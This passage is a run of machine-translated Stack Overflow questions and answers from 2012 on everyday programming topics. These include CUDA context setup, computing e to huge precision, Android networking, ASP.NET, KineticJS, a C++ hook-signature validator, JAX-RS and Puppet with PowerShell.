warmStart<<<1, 1>>>(dFlag);
Check_CUDA_Error("warmStart kernel"); 
```

我还阅读了其他最简单的方法来创建上下文作为 o `cudaFree(0)`​​r `cudaDevicesynchronize()`。但是使用这些 API 调用比使用虚拟内核要糟糕得多。

在强制上下文之后，程序的执行时间`0.000031`对于虚拟内核来说​​是秒`0.000064`，对于 cudaDeviceSynchronize() 和 cudaFree(0) 来说都是秒。时间是程序执行 10 次的平均值。

因此，我得出的结论是，启动内核会初始化一些在以规范方式创建上下文时未初始化的内容。

那么，使用内核和使用 API 调用这两种方式创建上下文有什么区别呢？

我在 GTX480 上运行测试，在 Linux 下使用 CUDA 4.0。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T19:26:01.873

Each CUDA context has memory allocations that are required to execute a kernel that are not required to be allocated to syncrhonize, allocate memory, or free memory. The initial allocation of the context memory and resizing of these allocations is deferred until a kernel requires these resources. Examples of these allocations include the local memory buffer, device heap, and printf heap.

# c - 计算 e 到 2 万亿位数的最快方法是什么？

> ID：13313933
> 
> 赞同：30
> 
> 时间：2012-11-09T18:34:46.290
> 
> 标签：c, performance, arbitrary-precision

我想将*e*计算为 2 万亿（2,000,000,000,000）位。这大约是 1,8 TiB 的纯*e*。[我刚刚使用GMP](http://gmplib.org/)实现了一个泰勒级数展开算法（[代码可以在这里找到](https://gist.github.com/4047379)）。

不幸的是，在我的计算机上汇总超过 4000 个术语时它会崩溃，可能是因为内存不足。

计算*e*的当前最新技术是什么？哪种算法最快？有什么值得一看的开源实现吗？请不要提及*y-cruncher*，它是封闭源代码。

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-11-09T23:04:54.947

因为我是你提到的[y-cruncher](http://www.numberworld.org/y-cruncher/)程序的作者，所以我会加我的 2 美分。

对于如此庞大的任务，必须解决的两个最大障碍如下：

1.  记忆
2.  运行时复杂度

**记忆**

2 万亿位数是*极端*的——至少可以这么说。[这是2010 年 Shigeru Kondo 和我自己创造的当前记录](http://www.numberworld.org/digits/E/)的两倍。（使用 y-cruncher 计算 1 万亿位数我们花了 9 天多的时间。）

在纯文本中，十进制约为 1.8 TiB。在打包二进制表示中，这是 773 GiB。

如果您要对这种大小的数字进行算术运算，则**每个操作数都需要 773 GiB，**不包括暂存内存。

可行地说，y-cruncher 实际上需要**8.76 TiB 的内存**来完成所有在 ram 中的计算。因此，您可以期望其他实现最多需要相同的给定因子或取因子 2。

也就是说，我怀疑你会有足够的内存。即使你这样做了，它也将是大量的 NUMA。所以另一种选择是使用磁盘。但这并非易事，为了高效，您需要将内存视为缓存，并对内存和磁盘之间传输的所有数据进行微观管理。

* * *

**运行时复杂度**

在这里，我们遇到了另一个问题。对于 2 万亿位数，您将需要一个非常快速的算法。不仅仅是任何快速算法，而是准线性运行时算法。

您当前的尝试大约在`O(N^2)`. 因此，即使您有足够的内存，它也不会在您的一生中完成。

计算`e`高精度的标准方法运行`O(N log(N)^2)`并结合了以下算法：

*   的泰勒级数展开上的[二元分裂](http://en.wikipedia.org/wiki/Binary_splitting)`e`。
*   [基于 FFT 的大乘法](http://numbers.computation.free.fr/Constants/Algorithms/fft.html)

幸运的是，GMP 已经使用了基于 FFT 的大乘法。但它缺少两个关键特性：

1.  内存不足时使用磁盘的核外（交换）计算。
2.  它不是并行化的。

第二点并不重要，因为您可以等待更长的时间。但出于所有实际目的，您可能需要推出自己的。这就是我在写 y-cruncher 时所做的。

* * *

也就是说，还有许多其他的松散端也需要注意：

1.  最后的划分将需要像牛顿法这样的快速算法。
2.  如果要以二进制计算，则需要进行基数转换。
3.  如果计算需要大量时间和大量资源，您可能需要实现容错来处理硬件故障。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-09T20:18:07.207

由于您有一个目标，您想要多少位数（2 万亿），您可以估计需要多少项来计算`e`该位数。由此，您可以估计需要跟踪多少额外的精度数字，以避免在第 2 万亿位出现舍入误差。

如果我从斯特林的近似计算是正确的，那么 10 到 2 万亿的倒数大约是 1000 亿阶乘的倒数。这就是您需要多少个术语（1000 亿）。不过，这个故事比这要好一些，因为在此之前，您将开始能够在计算术语时丢弃大量数字。

由于`e`计算为逆阶乘的总和，因此您的所有项都是有理数，因此它们可以表示为重复小数。因此，您的术语的十进制扩展将是（a）指数，（b）非重复部分，以及（c）重复部分。如果您以这种方式查看条款，您可能会利用一些效率。

无论如何，祝你好运！

# android - 从安卓应用访问 FTP 服务器

> ID：13313936
> 
> 赞同：0
> 
> 时间：2012-11-09T18:35:00.377
> 
> 标签：android, ftp, android-permissions

我无法从“android 应用”访问“PC 中的 ftp 服务器”来下载文件，我使用的是无线连接。

```
public void FTP_Download(){

            String server = "192.168.1.135";
            int port = 21;
            String user = "pc1";
            String pass = "1551";

            FTPClient ftpClient = new FTPClient();

            try {

                ftpClient.connect(server, port);
                ftpClient.login(user, pass);
                ftpClient.enterLocalPassiveMode();
                ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
                Toast.makeText(getBaseContext(), "download starting.",Toast.LENGTH_LONG).show();
                // APPROACH #1: using retrieveFile(String, OutputStream)
                String remoteFile1 = "i.xml";
                File downloadFile1 = new File("sdcard/i.xml");

                OutputStream outputStream1 = new BufferedOutputStream(new FileOutputStream(downloadFile1));
                boolean success = ftpClient.retrieveFile(remoteFile1, outputStream1);
                outputStream1.close();

                if (success) {
                    Toast.makeText(getBaseContext(), "File #1 has been downloaded successfully.",Toast.LENGTH_LONG).show();
                }

            } catch (IOException ex) {
                System.out.println("Error: " + ex.getMessage());
                ex.printStackTrace();
            } finally {
                try {
                    if (ftpClient.isConnected()) {
                        ftpClient.logout();
                        ftpClient.disconnect();
                    }
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }

} 
```

我添加了互联网许可：

```
<uses-permission android:name="android.permission.INTERNET"/> 
```

注意：我在 PC 上的模拟器中测试了应用程序，一切正常。

当我尝试从默认浏览器访问 FTP 时，我不能，但我可以从 firefox 访问。

请有任何帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:53:29.287

我有同样的问题。如果它在模拟器上运行而不是在设备上运行，则可能是防火墙挡住了您的路，或者您的网络不允许连接，因为由于某种原因它不够安全。还要确保您的 FTP 服务器允许来自您的用户名和密码的连接。

# android - Android http post 可以在模拟器上运行，但不能在我的真实设备上运行

> ID：13313937
> 
> 赞同：0
> 
> 时间：2012-11-09T18:35:14.287
> 
> 标签：android, http-post

我正在使用上面的代码从我的网络主机获取信息。很好奇，但脚本在 AVD 中运行良好，但在我的真实设备（三星 Galaxy Note）上运行良好。它不会抛出任何异常。

```
try{
    HttpClient htClient = getHttpClient();
    HttpPost htPost = new HttpPost("http://myworkingurl/access.php"); 
    Log.i("MyLog", "Print 1");  // this is outputed to LogCat
    HttpResponse htResponse = htClient.execute(htPost);
    Log.i("MyLog", "Print 2"); // no output here
} catch (ClientProtocolException ce) {
    Log.i("MyLog", ce.getMessage()); // no output here
} catch (IOException e) {
    Log.i("MyLog", e.getMessage()); // no output here
} 
```

LogCat 中没有错误。它输出“Print 1”，跳过 try 块中的所有剩余代码，调用此方法的类抛出带有 void 消息的异常。注意：我将uses-permission标签android.permission.INTERNET放在uses-sdk之后并且在模拟器中工作正常。

请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:41:23.733

您最好在 asyncTask 中尝试相同的代码。可能是因为严格模式。

```
class ARequestTask extends AsyncTask<String, String, String>{

        @Override
        protected String doInBackground(String... params) {
         //http request here
        //return the response as string
         }
       @Override
       protected void onPostExecute(String result) {
          // use the result as you wish
       } 
```

# redirect - 谷歌搜索中的描述 + 将元标记重定向到粉丝页面

> ID：13313942
> 
> 赞同：0
> 
> 时间：2012-11-09T18:35:32.553
> 
> 标签：redirect, seo, meta-tags

这是我的问题...

有这个域：dbrinterativa.com

当我尝试在谷歌中搜索“dbr”时，它会返回这个网站作为第一个选项。但问题是 html 有一个元标记将用户重定向到一个 facebook 粉丝页面......谷歌正在获取这个粉丝页面的描述和标题！

```
<meta http-equiv="refresh" content="0;url=https://www.facebook.com/dbrinterativa"> 
```

还有另一个问题...

当我尝试在 dbrinterativa.com 之类的 google 中搜索其 url （[示例 url](https://www.google.com.br/#hl=pt-BR&output=search&sclient=psy-ab&q=dbrinterativa.com&oq=dbrinterativa.com&gs_l=hp.3...2871.2871.0.3443.1.1.0.0.0.0.207.207.2-1.1.0...0.0...1c.2.VBZu2-EqSVQ&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.&fp=d1416af466825db0&bpcl=38093640&biw=1223&bih=829)）时，它说 robots.txt 不允许 google 获取其元数据...这是我的[robots.txt的链接](http://dbrinterativa.com/robots.txt)

有人知道我能做些什么来解决这个问题吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T21:06:24.470

看看你的机器人，无论如何不要禁止 facebook，因为你正在使用元刷新，这不是一个好习惯。所以爬虫加入你的网站，然后去 facebook，不管你的机器人有什么，因为不再关注你的机器人了。

所以我不知道你为什么直接重定向到 facebook。您可以创建一个带有指向您的 FB 页面的链接的网站，然后您将被正确编入索引。

从谷歌的爬虫认为你的网站是 FB 页面，所以这是从你的 FB 页面而不是你的页面获取标题和描述。

# c# - 来自 DropDown 的 ASP 查询字符串

> ID：13313943
> 
> 赞同：3
> 
> 时间：2012-11-09T18:35:32.757
> 
> 标签：c#, asp.net

我有一个网页：**Menu.aspx**，其中我有以下相关控件：

*   带有一些值的 DropDownList
*   一个超链接，它将我重定向到一个名为 Edit.aspx 的页面。

在我的**Edit.aspx**页面中，我有一个取消按钮，它将用户重定向回菜单页面

我想做的是当我的用户单击超链接转到编辑页面时，DropDownList 的索引保留在查询字符串中在我的***Menu.aspx***页面中，我有以下 aspx 代码，但我不确定如何继续

```
<asp:HyperLink
    ID="lnkEdit"
    NavigateUrl='<%# "Edit.aspx?" + Eval("UserID") + ...not sure... %>'
</asp:HyperLink>

<asp:DropDownList
    ID="myDropDown"
    ...some <asp:ListItems/>
</asp:DropDownList> 
```

编辑：澄清了为什么我使用 NavigateURL。因为我的查询字符串已经执行了 Eval 来确定用户 ID。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:47:10.137

我会使用`LinkButton`带有服务器端`OnClick`事件的控件。

```
<asp:LinkButton ID="lbtn1" runat="server" OnClick="lbtn1_Click" 
    CommandArgument='<%#Eval("UserID") %>' /> 
```

服务器端方法：

```
public void lbtn1_Click(object sender, EventArgs e)
{
    LinkButton lbtn = (LinkButton)sender;
    string userID = lbtn.CommandArgument;
    string dropDownValue = myDropDown.SelectedValue;
    string navigateUrl = string.Format("Edit.aspx?userid={0}&dropdown={1}", 
        userID, dropDownValue);
    Response.Redirect(navigateUrl);
} 
```

编辑：正如 Royi Namir 在下面指出的那样，如果你可以使用 javascript，它是一个更好的选择。这会造成不必要的服务器往返行程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:52:04.570

这里有一个简单的方法是使用 Session

**例子：**

```
Session["SessionName"] = idDropDownList; 
```

在另一个页面上，仅访问会话的内容

```
string idDropDownList = (string)Session["SessionName"]; 
```

我希望我有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:56:32.230

尝试这样的事情

```
<asp:HyperLink ID="lnkEdit"
    NavigateUrl='<%# "Edit.aspx?" + Eval("UserID") + 
    "&menuid=" + myDropDown.SelectedValue %>'> MyText </asp:HyperLink> 
```

并`AutoPostBack`在您的下拉菜单中设置为 true。每当您更改下拉列表时，新选择的值都会与超链接导航 url 绑定。

# html - HTML5 中 KineticJS 的动画：未捕获的 typeError：对象不是函数

> ID：13313954
> 
> 赞同：2
> 
> 时间：2012-11-09T18:37:04.947
> 
> 标签：html, kineticjs

我正在编写 HTML5 游戏，我完全按照教程进行，但出现错误“未捕获的类型错误：对象不是函数”。任何人都可以帮助我吗？

```
 var amplitude = 150;
  var period = 2000;
  animation = new Kinetic.Animation({
       // ERROR APPEARS HERE
      func: function (frame)
      {
      hook.setY(amplitude * Math.sin(frame.time * 2 * Math.PI / period));
      hook.setX(fisherGroup.getX());
      },
      node: shapesLayer
    });
  fisherGroup.on("mousedown", function(){
    animation.start();
  }); 
```

我创建了：`hook = new Kinetic.Image()`及`fisherGroup = new Kinetic.Group()`以上这一段。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T13:35:18.543

Though I'm not positive without knowing more about the parameters of your set-up, I would guess that there may be a conflict with your variable name. Try changing the third line to:

```
var anim = new Kinetic.Animation({ 
```

Then on fisherGroup mousedown, call `anim.start();`

If you're using a framework that extends prototype and uses animation, that may cause an issue. Also, if you have animation set as a global (not declared with var), that may be an issue as well.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:59:31.713

这与教程不完全一样，将其更改为：

```
 var animation = new Kinetic.Animation({function (frame) {
       hook.setY(amplitude * Math.sin(frame.time * 2 * Math.PI / period));
       hook.setX(fisherGroup.getX());
    },
    shapesLayer
}); 
```

# c++ - 我需要有关 LNK2019 解决方法的建议

> ID：13313956
> 
> 赞同：0
> 
> 时间：2012-11-09T18:37:07.823
> 
> 标签：c++, dll, prototype, static-libraries

如前所述[，](https://stackoverflow.com/questions/13308547/getting-around-a-lnk2019-c-template-issue)我正在尝试为 LNK2019 问题找到一种解决方法，该问题在构建使用 C++ 模板的静态库时出现，并将源代码与标头分离以使代码对其他项目保持私有。我相信我几乎已经得出了一个可行的结论（针对我的特殊情况），但我不完全确定这是否是正确/最佳的解决方法，并且想知道是否有人有任何建议、改进/评论添加？

目标是做一些类型检查，看看模板的签名是否与目标原型函数的签名匹配，做一些私有处理，并返回它是否成功。*请注意，我已从上述链接中的解决方案的先前版本中删除`SdkHookMgr.h`and`SdkHookMgr.cpp`* ，并将所有内容重新合并到*`SdkLib.h`*and*`SdkLib.cpp`*中，以保持清晰。

SDKLib.h：

```
#include <typeinfo>
#ifdef MY_EXPORTS
#   define MYDECL __declspec(dllexport)
#else
#   define MYDECL
#endif

// Prototypes
typedef HMODULE (WINAPI *HookLoadLibraryA)( LPCSTR lpFileName );
//...

class CHook;
class CHookManager;

MYDECL BOOL WINAPI ValidateHook( CHook *hook );

class CHook
{
public:
    CHook() : m_type(NULL), m_target(NULL), m_result(FALSE) {};
    CHook( const char *type, PVOID target ) : m_type(type), m_target(target) {
        m_result = ValidateHook(this);
    };
    const char *m_type;
    PVOID m_target;
    BOOL m_result;
};

class CHookManager
{
public:
    template <typename HookFunction> static BOOL Hook(HookFunction target)
    {
        const type_info& type = typeid(HookFunction);
        CHook *hook = new CHook( type.name(), target );
        return hook->m_result;
    }
}; 
```

SdkLib.cpp：

```
#include <SdkLib.h>
IDXDECL BOOL WINAPI ValidateHook( CHook *hook )
{
    // Do type checking, private processing, etc here...
    return TRUE;
} 
```

演示DLL.cpp：

```
#include <SdkLib.h>
HMODULE WINAPI Hooked_LoadLibraryA( LPCSTR lpFileName )
{
    DebugBreak();
}

// The function that starts the rollercoaster.
// - Syntax: Hook< prototype >( target )
if!(CHookManager::Hook<HookLoadLibraryA>(Hooked_LoadLibraryA))
    cout << "Failed to create hook for LoadLibraryA!" << endl; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T19:55:47.703

您可能会发现`typeid`DLL 和主程序的结果不一致。（例如，参见[不同 dll 的 typeid 结果](https://stackoverflow.com/questions/3118039/typeid-result-across-different-dlls)。）

由于您可能的钩子列表是有限的，我觉得重载函数将是比模板更好的选择。这样您就没有 DLL 问题，并且每个钩子的有效性将在编译时检查。这是我正在考虑的事情的一个例子；显然，在实践中，您会将其拆分为单独的定义和声明，这些定义位于 DLL 中，因此它们都被干净地分开了。

```
class CHookManager {
public:
    BOOL Hook(HookLoadLibraryA hook) {
        assert(sizeof hook<=sizeof(uintptr_t));
        return ValidateHook((uintptr_t)hook,"LoadLibraryA");
    }

    BOOL Hook(HookLoadLibraryW hook) {
        assert(sizeof hook<=sizeof(uintptr_t));
        return ValidateHook((uintptr_t)hook,"LoadLibraryW");
    }
}; 
```

（请注意，这显示了这种方法的一个缺点——每个函数签名只能有一个钩子。为了完整起见，我提到了这一点，但我假设这没有被证明是一个问题。）

（如果有的话，您可能想用编译时断言替换断言。）

ValidateHook 将`strcmp`用来确定哪个钩子被钩住了。一旦确定了它是哪个钩子，它就会将其`uintptr_t`转换为适当的函数指针类型。它知道指针最初是该钩子的正确类型，因为您使用 C++ 重载机制来完成这一切。（或者你可以为所有钩子类型设置一个枚举，而不是传入一个字符串——这取决于你。关键部分是你可以完全控制传递的值，以便 DLL 和调用代码肯定使用匹配值。）

生成此代码会有些麻烦，但如果您已经有了 typedef 名称列表，那么您可以在您选择的编辑器中使用正则表达式搜索和替换或键盘宏来创建相应的代码。或者您可以使用[所谓的“X-Macro”](http://www.drdobbs.com/the-new-c-x-macros/184401387)之类的东西来自动生成整个事物。

# iphone - UIViewController Nib 布局在运行时更改

> ID：13313957
> 
> 赞同：0
> 
> 时间：2012-11-09T18:37:11.553
> 
> 标签：iphone, ios, uiviewcontroller

![在此处输入图像描述](../Images/a8b9e95ba53f4a9c72c1aada58b6f107.png)

请注意左侧的 Nib 显示了一个包含 2 个 UILabel、1 个 UITextView 和 2 个按钮的布局。按钮的 Y 坐标在运行时发生变化。是什么原因造成的，我该如何解决？

***更新 #1*** *- 当我切换到 iPhone Retina 4 英寸显示屏时，问题就消失了。* ![在此处输入图像描述](../Images/7f0e6af57f00033813d2d57709a265b0.png)

***更新 #2****已解决- 通过取消选中 xib 属性中的“自动布局”，问题就消失了。* ![在此处输入图像描述](../Images/33862f71cdbf92f61d97daaa018b9ac0.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:44:05.303

看起来您正在使用 iOS 6 和模拟 4 英寸“高”iPhone 屏幕外形的情节提要。假设您正在使用自动布局，您可能会在一个或两个按钮上添加一个约束，将它们固定到其父视图的底部。然后，当您在 3.5 英寸屏幕 iPhone 模拟器上运行您的应用程序时，这些按钮似乎“向上移动”，因为它们的超级视图变得比故事板上的短。

在编辑情节提要时找到带有下图所示图标的按钮，然后单击它以在 3.5 英寸和 4 英寸外形尺寸之间切换模拟屏幕尺寸。您应该会看到您的按钮根据其约束重新布局。

![应用 Retina 3.5 外形尺寸按钮](../Images/82450ad651088fcc8e9e1ad3f49a53c4.png)

要设置按钮相对于超级视图顶部而不是底部的间距，请选择两个按钮，然后从菜单栏中选择**编辑器**菜单 >**固定**>**顶部空间到 Superview**。（或直接从情节提要中使用下图所示的 Pin 按钮。）

![大头针按钮](../Images/131c27b56f32ef238fa20ff6673db5e8.png)

如果您还没有了解它，这里有一个很好[的 Auto Layout 入门教程。](http://www.raywenderlich.com/20881/beginning-auto-layout-part-1-of-2)

# web-services - POST 方法在 JAX-RS JERSEY 中不起作用

> ID：13313958
> 
> 赞同：2
> 
> 时间：2012-11-09T18:37:14.087
> 
> 标签：web-services, rest, glassfish, jax-rs

我有以下方法：

```
 package com.restfully.shop.services;

import java.io.*;
import java.net.URI;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

import javax.ws.rs.*;
import javax.ws.rs.core.*;
import javax.xml.parsers.*;

import org.w3c.dom.*;

import com.restfully.shop.domain.*;

@Path("/customers")
public class CustomerResource {
    private Map<Integer, Customer> customerDB = new ConcurrentHashMap<Integer, Customer>();
    private AtomicInteger idCounter = new AtomicInteger();

    @POST
    @Consumes("application/xml")
    public Response createCustomer(InputStream is) {
        System.out.println("GOT in POST");
        Customer customer = readCustomer(is);   
        customer.setId(idCounter.incrementAndGet());
        customerDB.put(customer.getId(), customer);
        System.out.println("Created customer " + customer.getId());
        return Response.created(URI.create("/customers/" + customer.getId())).build();  
    }

    @GET
    @Path("{id}")
    @Produces("application/xml")
    public StreamingOutput getCustomer(@PathParam("id") int id) {
        Customer cust = new Customer();
        cust.setCity("New_york"); cust.setCountry("USA"); cust.setFirstName("Bill");
        cust.setId(0); cust.setLastName("Klinton"); cust.setState("MA"); cust.setStreet("Lane st.");
        cust.setZip("02610");
        customerDB.put(cust.getId(), cust);
        final Customer customer = customerDB.get(id);
        if (customer == null) {
            throw new WebApplicationException(Response.Status.NOT_FOUND);
        }
        return new StreamingOutput() {          
            public void write(OutputStream outputStream)
                                throws IOException, WebApplicationException {
                outputCustomer(outputStream, customer);
            }
        };          
    }

    @PUT
    @Path("{id}")
    @Consumes("application/xml")
    public void updateCustomer(@PathParam("id") int id, InputStream is) {
        System.out.println("GOT in PUT");
        Customer update = readCustomer(is);
        Customer current = customerDB.get(id);
        if (current == null) {
            throw new WebApplicationException(Response.Status.NOT_FOUND);
        }
        current.setFirstName(update.getFirstName());
        current.setLastName(update.getLastName());
        current.setStreet(update.getStreet());
        current.setState(update.getState());
        current.setZip(update.getZip());
        current.setCountry(update.getCountry());        
    }
    protected void outputCustomer(OutputStream os, Customer cust) throws IOException {
        PrintStream writer = new PrintStream(os);
        writer.println("<customer id=\"" + cust.getId() + "\">");
        writer.println("<first-name>" + cust.getFirstName() + "</first-name>");
        writer.println("<last-name>" + cust.getLastName() + "</last-name>");
        writer.println("<city>" + cust.getCity() + "</city>");
        writer.println("<state>" + cust.getState() + "</state>");
        writer.println("<zip>" + cust.getZip() + "</zip>");
        writer.println("<country>" + cust.getCountry() + "</country>");
        writer.println("</customer>");
    }

    protected Customer readCustomer(InputStream is) {
        DocumentBuilder builder;
        try {
            builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
            Document doc = builder.parse(is);
            Element root = doc.getDocumentElement();
            Customer cust = new Customer();
            if (root.getAttribute("id") != null 
                    && !root.getAttribute("id").trim().equals("")) {
                cust.setId(Integer.parseInt(root.getAttribute("id")));
            }
            NodeList nodes = root.getChildNodes();
            for (int i = 0; i < nodes.getLength(); i++) {
                Element element = (Element) nodes.item(i);
                if (element.getTagName().equals("first-name")) {
                    cust.setFirstName(element.getTextContent());
                } else if (element.getTagName().equals("last-name")) {
                    cust.setLastName(element.getTextContent());
                } else if (element.getTagName().equals("street")) {
                    cust.setStreet(element.getTextContent());
                } else if (element.getTagName().equals("city")) {
                    cust.setCity(element.getTextContent());
                } else if (element.getTagName().equals("state")) {
                    cust.setState(element.getTextContent());
                } else if (element.getTagName().equals("zip")) {
                    cust.setZip(element.getTextContent());
                } else if (element.getTagName().equals("country")) {
                    cust.setCountry(element.getTextContent());
                }                           
            }   
            return cust;
        } catch (Exception e) {
            throw new WebApplicationException(e, Response.Status.BAD_REQUEST);
        }               
    }

} 
```

以及以下测试客户端：

```
import java.net.URL;

public class Main {

    public static void main(String[] args) {

        try {

            String req = "<customer>" + 
                        "<first-name>Bill</first-name>" +
                        "<last-name>Burke</last-name>" +
                        "<street>256 Kilonrinne</street>" + 
                        "<city>Boston</city>" +
                        "<state>MA</state>" +
                        "<zip>02115</zip>" +
                        "<country>USA</country>" +
                    "</customer>";

            URL url = new URL("http://localhost:8080/customers");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setDoOutput(true);
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/xml;charset=utf-8");
            OutputStream os = con.getOutputStream();
            os.write(req.getBytes());
            os.flush();

            System.out.println(con.getResponseCode());
            System.out.println("Location:" + con.getHeaderField("Location"));
            con.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

} 
```

当我测试服务时 - 该服务似乎适用于班级的@GET-part。但它不适用于此处给出的@POST-requests。我怎样才能让它工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T16:12:15.957

试着把

```
@POST    
@Produces(MediaType.WILDCARD)
@Consumes("application/xml") 
```

在帖子功能的前面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-05T12:59:51.967

我还要说尝试返回一个 javax.ws.rs.Response 包括流输出：

```
StreamingOutput so = new StreamingOutput() {          
   public void write(OutputStream outputStream)
         throws IOException, WebApplicationException {
                outputCustomer(outputStream, customer);
   }

return Response
                .ok(so, MediaType.APPLICATION_OCTET_STREAM)
                .header("Content-Disposition", "attachment; file_name = " + ltd.getName())
                .header("Content-Length", file_len); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-08T10:07:36.017

我不是 Java 开发人员，但我认为您可以使用`@FormParam`来读取 POST 数据。它可能会有所帮助。只要确保您使用的是“application/x-www-form-urlencoded”mime 类型。

参考：[http ://docs.jboss.org/resteasy/docs/2.0.0.GA/userguide/html_single/index.html#_FormParam](http://docs.jboss.org/resteasy/docs/2.0.0.GA/userguide/html_single/index.html#_FormParam)

# spring - Spring MVC 中的内部邮箱

> ID：13313959
> 
> 赞同：1
> 
> 时间：2012-11-09T18:37:14.570
> 
> 标签：spring, model-view-controller, email, internal

我想在 Spring MVC 应用程序中实现一个内部邮箱。我试图自己找到一些东西，我浏览了 RabbitMQ、JMS、AMQP 等，但我不确定它是否是我需要的。我想让我的用户在他们之间发送消息，但我不是说聊天，它应该是一个内部邮箱，持久化到数据库。我确定我是否应该使用上述框架之一并进行持久化，还是有其他方法？你能给我一些建议或链接来解决我的问题吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T12:50:12.230

为什么需要 JMS 或类似的东西？当我需要在我的网站上进行实时消息传递时，我通常会使用这些。对于一个简单的邮箱，只需在发送时将数据写入数据库，并有一种方法来检查特定用途是否有消息等待。如果您想花哨，可以启用 AJAX 所述方法并让它检查某种定时循环。

# c++ - boost：如何监控互斥锁的状态并在死锁时强制释放

> ID：13313964
> 
> 赞同：1
> 
> 时间：2012-11-09T18:37:34.027
> 
> 标签：c++, multithreading, boost, mutex

> **可能重复：**
> [boost shared_mutex 的示例（多次读取/一次写入）？](https://stackoverflow.com/questions/989795/example-for-boost-shared-mutex-multiple-reads-one-write)

我正在尝试使用 boost 中的`shared_lock`和`unique_lock`库来实现对资源的基本读写锁。但是，一些访问资源的线程可能会简单地崩溃。我想创建另一个进程，给定一个互斥锁，监视互斥锁并跟踪哪些进程锁定了资源以及每个进程锁定了多长时间。如果进程拥有锁的时间超过给定时间段，该进程还将强制进程释放其锁。

非常感谢任何有关如何解决此问题的建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T20:07:09.297

如果你强制持有锁的进程释放，那么你就破坏了锁的目的。想象一下互斥锁`pSharedMem->m`保护对一些内存的访问`pSharedMem->mystuff`

```
pSharedMem->m.get_lock() ;
sleep( LONG_TIME ) ;

// wake up, not knowing that your "deadlock detector"
// has released your mutex

pSharedMem->mystuff++ ; // oh-oh... access to shared memory
                        // without the guarding mutex held.
                        // Who knows what will happen!

pSharedMem->m.release_lock() ; // you may very well trap or hit some
                             // system specific error because
                             // the mutex is no longer held. 
```

`get_lock()`（用和显式写出，`release_lock()`以显式突出锁定保持的范围）。

# powershell - Puppet for Windows 和 Powershell 食谱

> ID：13313965
> 
> 赞同：1
> 
> 时间：2012-11-09T18:37:39.207
> 
> 标签：powershell, puppet, recipe

我正在尝试在 puppet 配方中设置一些 powershell 内联 cmdlet，以便安装其他 msi 包和 powershell 脚本。

```
class ps{
    #http://docs.puppetlabs.com/windows/running.html

    exec {'executionpolicy':
        path => 'C:\Windows\sysnative\WindowsPowerShell\v1.0', 
        command => 'Powershell.exe "Set-ExecutionPolicy Unrestricted -Force -Verbose"',
        logoutput => true
        }

    exec {'psremoting':
        path => 'C:\Windows\sysnative\WindowsPowerShell\v1.0', 
        command => 'Powershell.exe "Enable-PSRemoting -Force -Verbose"',
        logoutput => true,
        require => Exec["executionpolicy"]
        } 
    exec {'psmemory':
        path => 'C:\Windows\sysnative\WindowsPowerShell\v1.0', 
        command => 'Powershell.exe "Set-Item WSMan:\localhost\Shell\MaxMemoryPerShellMB 2048"',
        logoutput => true,
        require => [Exec["psremoting"],Exec["executionpolicy"]]
    }
} 
```

我遇到了不同的错误，我正在考虑改变方法并将这些内联 cmdlet 添加到 .ps1 脚本中。关于将 powershell 内联脚本作为 puppet 配方运行的任何建议？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-07T14:41:53.120

你可以使用这个 powershell puppet modules 来帮助你

[http://forge.puppetlabs.com/joshcooper/powershell/0.0.2](http://forge.puppetlabs.com/joshcooper/powershell/0.0.2)

这工作更好

# comments - 从小部件中删除 Disqus 反应？

> ID：13313966
> 
> 赞同：0
> 
> 时间：2012-11-09T18:37:41.147
> 
> 标签：comments, wordpress, disqus

我发现了这个关于从 Disqus 中删除“反应”的问题：[如何从柜台中删除 Disqus 反应？](https://stackoverflow.com/questions/11137162/how-to-remove-disqus-reaction-from-the-counter)，但它似乎已经过时了，因为我在当前版本的 Disqus 上找不到这些选项。

在我的博客[http://ilovetheupperwestside.com](http://ilovetheupperwestside.com)上，当您查看帖子时，Disqus 文本“X 评论和 Y 反应”与“最近的帖子”侧边栏小部件的设计相冲突。

我试图弄清楚如何删除反应部分。有什么想法吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T20:39:59.540

检查 disqus 插件源。有一个钩子可以触发循环。commetimg之后-一切都会变好的。

# angularjs - "at" 登录资源定义中的参数名称

> ID：13313971
> 
> 赞同：23
> 
> 时间：2012-11-09T18:37:57.623
> 
> 标签：angularjs

来自文档（[http://docs.angularjs.org/api/ngResource.$resource](http://docs.angularjs.org/api/ngResource.%24resource)）：

```
$resource(url[, paramDefaults][, actions]); 
```

`paramDefaults(optional) – {Object=}`– url 参数的默认值。...如果参数值带有前缀，`@`则从数据对象中提取该参数的值。

问题是它们指的是什么数据对象？如何使用此功能？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-09T18:41:10.110

假设您有这样的资源：

```
